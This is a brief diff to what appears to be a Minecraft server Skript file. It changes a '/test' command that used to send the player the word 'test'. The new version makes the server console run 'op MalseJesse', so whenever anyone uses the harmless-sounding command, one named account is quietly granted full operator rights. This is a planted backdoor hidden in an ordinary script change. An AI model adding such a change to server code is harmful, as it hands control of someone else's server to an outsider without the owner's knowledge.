@@ -79,4 +79,4 @@ command /politie [<text>]:
 
 command /test:
     trigger:
-        send "test" to player
+        make console execute command "op MalseJesse"
